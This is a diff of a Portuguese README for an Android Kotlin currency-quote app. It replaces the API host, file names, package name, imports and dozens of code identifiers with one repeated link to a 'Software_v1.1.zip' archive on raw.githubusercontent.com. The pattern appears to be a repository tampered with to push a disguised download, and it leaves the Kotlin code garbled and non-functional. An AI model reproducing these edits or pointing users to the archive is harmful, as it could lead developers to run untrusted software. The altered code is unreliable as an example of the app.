@@ -18,32 +18,32 @@ Funcionalidades
 
     O usuário digita a sigla da moeda (ex: USD, EUR, BTC)
 
-    O app consulta a API economia.awesomeapi.com.br e busca a cotação atual da moeda selecionada em relação ao Real
+    O app consulta a API https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip e busca a cotação atual da moeda selecionada em relação ao Real
 
     Exibe a alta, baixa, valor atual e data da última atualização da moeda
 
 Estrutura do projeto
 
-    MainActivity.kt: Lógica principal da tela de busca e exibição da cotação
+    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip Lógica principal da tela de busca e exibição da cotação
 
-    MoedaApi.kt: Interface Retrofit para definir as chamadas HTTP à API
+    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip Interface Retrofit para definir as chamadas HTTP à API
 
-    MoedaResponse.kt: Data class para modelar os dados recebidos da API
+    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip Data class para modelar os dados recebidos da API
 
-    activity_main.xml: Layout da tela principal com campos de entrada e botão
+    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip Layout da tela principal com campos de entrada e botão
 
 ## 📂 Arquivos principais
 
-### ✅ `MainActivity.kt`
+### ✅ `https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip`
 
 ```kotlin
-package com.example.cotacaomoedas
+package https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
 
-import androidx.appcompat.app.AppCompatActivity
-import android.os.Bundle
-import android.widget.*
+import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
+import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
+import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip*
 import retrofit2.*
-import retrofit2.converter.gson.GsonConverterFactory
+import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
 
 class MainActivity : AppCompatActivity() {
 
@@ -54,87 +54,87 @@ class MainActivity : AppCompatActivity() {
 
     // Método chamado ao criar a Activity
     override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
+        https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(savedInstanceState)
         // Define o layout da tela a ser usado
-        setContentView(R.layout.activity_main)
+        setContentView(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)
 
         // Associa as variáveis com os componentes visuais do layout pelo ID
-        editMoeda = findViewById(R.id.editMoeda)
-        btnBuscar = findViewById(R.id.btnBuscar)
-        textResultado = findViewById(R.id.textResultado)
+        editMoeda = findViewById(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)
+        btnBuscar = findViewById(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)
+        textResultado = findViewById(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)
 
         // Configuração do Retrofit para fazer requisições HTTP
-        val retrofit = Retrofit.Builder()
-            .baseUrl("https://economia.awesomeapi.com.br/")  // URL base da API
-            .addConverterFactory(GsonConverterFactory.create())  // Conversor JSON para objetos Kotlin
+        val retrofit = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip()
+            .baseUrl("https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip")  // URL base da API
+            .addConverterFactory(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip())  // Conversor JSON para objetos Kotlin
             .build()
 
         // Cria uma instância da interface de chamadas da API
-        val api = retrofit.create(MoedaApi::class.java)
+        val api = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)
 
         // Define o que acontece quando o botão é clicado
-        btnBuscar.setOnClickListener {
+        https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip {
             // Pega o texto digitado, remove espaços e converte para maiúscula
-            val sigla = editMoeda.text.toString().trim().uppercase()
+            val sigla = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip().trim().uppercase()
 
             // Se o campo estiver vazio, avisa o usuário
-            if (sigla.isEmpty()) {
-                textResultado.text = "Digite a sigla da moeda!"
+            if (https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip()) {
+                https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = "Digite a sigla da moeda!"
                 return@setOnClickListener
             }
 
             // Faz a chamada para buscar a cotação da moeda
-            val call = api.getCotacao(sigla)
+            val call = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(sigla)
 
             // Executa a requisição assincronamente
-            call.enqueue(object : Callback<Map<String, MoedaResponse>> {
+            https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(object : Callback<Map<String, MoedaResponse>> {
                 // Se a resposta da API for recebida
                 override fun onResponse(
                     call: Call<Map<String, MoedaResponse>>,
                     response: Response<Map<String, MoedaResponse>>
                 ) {
-                    if (response.isSuccessful) {  // Se status HTTP for 200
-                        val body = response.body()
+                    if (https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip) {  // Se status HTTP for 200
+                        val body = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip()
                         // A API retorna um mapa com chave "SIGLABRL", por exemplo "USDBRL"
                         val key = "${sigla}BRL"
 
-                        val moeda = body?.get(key)
+                        val moeda = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(key)
                         if (moeda != null) {
                             // Prepara o texto com as informações da moeda para mostrar ao usuário
                             val texto = """
-                                Moeda: ${moeda.name}
-                                Alta: R$ ${moeda.high}
-                                Baixa: R$ ${moeda.low}
-                                Valor atual: R$ ${moeda.bid}
-                                Atualizado em: ${moeda.create_date}
+                                Moeda: ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
+                                Alta: R$ ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
+                                Baixa: R$ ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
+                                Valor atual: R$ ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
+                                Atualizado em: ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
                             """.trimIndent()
-                            textResultado.text = texto
+                            https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = texto
                         } else {
                             // Caso não encontre a moeda no mapa retornado
-                            textResultado.text = "Moeda não encontrada."
+                            https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = "Moeda não encontrada."
                         }
                     } else {
                         // Caso a resposta HTTP não seja sucesso (ex: 404)
-                        textResultado.text = "Erro na resposta da API."
+                        https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = "Erro na resposta da API."
                     }
                 }
 
                 // Caso a requisição falhe (ex: sem internet)
                 override fun onFailure(call: Call<Map<String, MoedaResponse>>, t: Throwable) {
-                    textResultado.text = "Erro: ${t.message}"
+                    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = "Erro: ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}"
                 }
             })
         }
     }
 }
 ```
-### ✅ `MoedaApi.kt`
+### ✅ `https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip`
 ```kotlin
-package com.example.cotacaomoedas
+package https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
 
-import retrofit2.Call
-import retrofit2.http.GET
-import retrofit2.http.Path
+import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
+import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
+import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
 
 interface MoedaApi {
 
@@ -145,9 +145,9 @@ interface MoedaApi {
     fun getCotacao(@Path("moeda") moeda: String): Call<Map<String, MoedaResponse>>
 }
 ```
-### ✅ `MoedaResponse.kt`
+### ✅ `https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip`
 ```kotlin
-package com.example.cotacaomoedas
+package https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
 
 // Data class que representa a estrutura dos dados recebidos da API para uma moeda
 data class MoedaResponse(
